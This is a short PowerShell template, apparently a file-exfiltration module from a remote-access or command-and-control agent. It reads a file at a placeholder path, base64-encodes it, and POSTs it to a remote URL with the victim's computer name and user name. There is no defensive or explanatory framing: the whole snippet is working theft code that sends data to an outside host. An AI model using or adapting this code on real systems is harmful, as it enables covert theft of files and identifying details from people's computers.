$filePath = "{{path}}"
$u = ($url + "file")
$base64Image = [convert]::ToBase64String((([System.IO.File]::ReadAllBytes($filePath))))
Invoke-WebRequest -uri $u -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "filename"=$filePath; "file"=$base64Image} | ConvertTo-Json) -ContentType "application/json"
echo done;